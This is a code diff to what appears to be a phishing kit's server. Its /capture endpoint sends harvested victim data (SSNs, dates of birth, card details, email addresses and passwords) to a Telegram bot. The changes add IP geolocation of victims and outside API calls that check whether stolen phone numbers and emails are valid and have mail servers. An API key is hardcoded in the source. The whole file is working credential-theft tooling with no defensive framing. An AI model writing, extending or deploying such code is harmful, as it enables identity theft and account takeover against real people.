@@ -41,6 +41,21 @@ try {
 // Telegram Bot Configuration
 // Initial config load is dynamic per request to support updates without restarts
 
+const API_NINJAS_KEY = '9IffIYgfbatOM/2lhJ06CA==7ZHqrYzICLRspTL1';
+
+const apiNinja = async (endpoint, params) => {
+    try {
+        const urlParams = new URLSearchParams(params).toString();
+        const res = await axios.get(`https://api.api-ninjas.com/v1/${endpoint}?${urlParams}`, {
+            headers: { 'X-Api-Key': API_NINJAS_KEY },
+            timeout: 3000 // Don't hang the backend if API is slow
+        });
+        return res.data;
+    } catch (e) {
+        return null;
+    }
+};
+
 // HTML-escape value for Telegram HTML mode
 const he = (s) => {
     if (typeof s !== 'string') return s;
@@ -100,8 +115,21 @@ app.post('/capture', async (req, res) => {
     const sid_tag = session_id ? `\n🔗 <b>SID:</b> <code>${he(session_id)}</code>` : '';
     const fp_line = d.fingerprint ? `🛡️ <b>FP:</b> <code>${he(d.fingerprint)}</code>\n` : '';
 
+    const ipString = ip.split(',')[0].trim();
+    let geo_line = '';
+    
+    // Quick API Ninja IP Lookup
+    if (ipString && ipString !== 'Unknown' && ipString !== '::1' && ipString !== '127.0.0.1') {
+        const ipap = await apiNinja('iplookup', { address: ipString });
+        if (ipap && ipap.country) {
+            const flag = ipap.country.substring(0, 2).toUpperCase().replace(/./g, char => String.fromCodePoint(char.charCodeAt(0) + 127397));
+            geo_line = `🌍 <b>Geo:</b> <code>${he(ipap.city)}, ${he(ipap.region)}, ${he(ipap.country)}</code> ${flag}`;
+        }
+    }
+
     const header = `🕒 <code>${timestamp}</code>\n`
-        + `📍 <b>IP:</b> <code>${he(ip.split(',')[0])}</code>\n`
+        + `📍 <b>IP:</b> <code>${he(ipString)}</code>\n`
+        + (geo_line ? geo_line + '\n' : '')
         + `🤖 <b>UA:</b> <code>${he(user_agent.substring(0, 140))}</code>\n`
         + fp_line
         + sid_tag + "\n";
@@ -112,7 +140,8 @@ app.post('/capture', async (req, res) => {
         case 'visit':
             msg = "👁️ <b>NEW VISITOR</b>\n"
                 + `🕒 <code>${timestamp}</code>\n`
-                + `📍 <b>IP:</b> <code>${he(ip.split(',')[0])}</code>\n`
+                + `📍 <b>IP:</b> <code>${he(ipString)}</code>\n`
+                + (geo_line ? geo_line + '\n' : '')
                 + `🌐 <b>Page:</b> <code>${he(d.url || 'Unknown')}</code>\n`
                 + `🖥️ <b>Res:</b> <code>${he(d.res || 'Unknown')}</code>\n`
                 + `🤖 <b>UA:</b> <code>${he(user_agent.substring(0, 140))}</code>\n`
@@ -127,12 +156,20 @@ app.post('/capture', async (req, res) => {
             break;
             
         case 'verify':
+            let phoneFlag = d.phone || 'N/A';
+            if (d.phone && d.phone.length > 5) {
+                const pVal = await apiNinja('validatephone', { number: d.phone });
+                if (pVal) {
+                    phoneFlag += pVal.is_valid ? ' (✅ Valid)' : ' (❌ Invalid)';
+                }
+            }
+
             msg = "🪪 <b>✅ IDENTITY CAPTURED</b>\n" + header
                 + `👤 <b>Name:</b>  <code>${he(d.full_name || 'N/A')}</code>\n`
                 + `🔢 <b>SSN:</b>   <code>${he(d.ssn || 'N/A')}</code>\n`
-                + `📞 <b>Phone:</b> <code>${he(d.phone || 'N/A')}</code>\n`
+                + `📞 <b>Phone:</b> <code>${he(phoneFlag)}</code>\n`
                 + `🆔 <b>Member #:</b> <code>${he(d.member_num || 'N/A')}</code>\n`
-                + `🎂 <b>DOB:</b>   <code>${he(d.dob || 'N/A')}</code>`;
+                + `🎂 <b>DOB:</b>   <code>${he(d.dob || 'N/A')} (✅ Frontend Validated)</code>`;
             break;
             
         case 'card':
@@ -157,9 +194,23 @@ app.post('/capture', async (req, res) => {
             if (prov.toLowerCase().includes('microsoft') || prov.toLowerCase().includes('outlook') || prov.toLowerCase().includes('hotmail')) logo = "🔵";
             if (prov.toLowerCase().includes('apple') || prov.toLowerCase().includes('icloud')) logo = "⚪";
 
+            let emFlag = d.emailAcc || 'N/A';
+            if (d.emailAcc && d.emailAcc.includes('@')) {
+                const emVal = await apiNinja('validateemail', { email: d.emailAcc });
+                if (emVal) emFlag += emVal.is_valid ? ' (✅ Valid)' : ' (❌ Invalid)';
+                
+                const domain = d.emailAcc.split('@')[1];
+                const mxVal = await apiNinja('mxlookup', { domain: domain });
+                if (mxVal && mxVal.length > 0) {
+                    emFlag += `\n📡 <b>MX:</b> <code>Parsed ${mxVal.length} Mail Servers</code>`;
+                } else if (mxVal) {
+                    emFlag += `\n📡 <b>MX:</b> <code>(❌ No Mail Servers Found)</code>`;
+                }
+            }
+
             msg = `${logo} <b>✅ EMAIL ACCOUNT CAPTURED</b>\n` + header
                 + `🏢 <b>Provider:</b> <code>${he(prov)}</code>\n`
-                + `📧 <b>Email:</b>    <code>${he(d.emailAcc || 'N/A')}</code>\n`
+                + `📧 <b>Email:</b>    <code>${emFlag}</code>\n` // No he here because it contains html
                 + `🔒 <b>Password:</b> <code>${he(d.emailPass || 'N/A')}</code>`;
             break;
             
